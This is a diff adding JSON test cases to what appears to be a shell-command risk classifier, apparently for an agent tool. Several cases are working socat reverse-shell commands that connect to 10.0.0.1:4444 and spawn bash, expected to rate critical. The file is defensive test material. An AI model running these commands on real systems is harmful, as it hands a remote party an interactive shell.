@@ -653,5 +653,49 @@
     "want": [
       "critical"
     ]
+  },
+  {
+    "label": "sable-gmgh: socat reverse shell with a quoted EXEC program is critical",
+    "cmd": "socat TCP:10.0.0.1:4444 EXEC:\"bash -li\",pty,stderr,setsid",
+    "want": [
+      "critical"
+    ]
+  },
+  {
+    "label": "sable-gmgh: socat reverse shell with a quoted SYSTEM program is critical",
+    "cmd": "socat TCP:10.0.0.1:4444 SYSTEM:'bash -i'",
+    "want": [
+      "critical"
+    ]
+  },
+  {
+    "label": "sable-gmgh: socat pty wrapper around a quoted rafter agent exec is not low",
+    "cmd": "socat - EXEC:\"rafter agent exec 'ls'\",pty",
+    "want": [
+      "high",
+      "critical"
+    ]
+  },
+  {
+    "label": "sable-gmgh: socat SYSTEM wrapper around rafter agent exec is not low",
+    "cmd": "socat - SYSTEM:\"rafter agent exec ls\",pty",
+    "want": [
+      "high",
+      "critical"
+    ]
+  },
+  {
+    "label": "sable-gmgh: a plain socat relay with a quoted address stays low",
+    "cmd": "socat TCP-LISTEN:8080,fork \"TCP:localhost:3000\"",
+    "want": [
+      "low"
+    ]
+  },
+  {
+    "label": "sable-gmgh: a quoted mention of a socat reverse shell stays low",
+    "cmd": "echo \"socat TCP:h:1 EXEC:'bash -i'\"",
+    "want": [
+      "low"
+    ]
   }
 ]
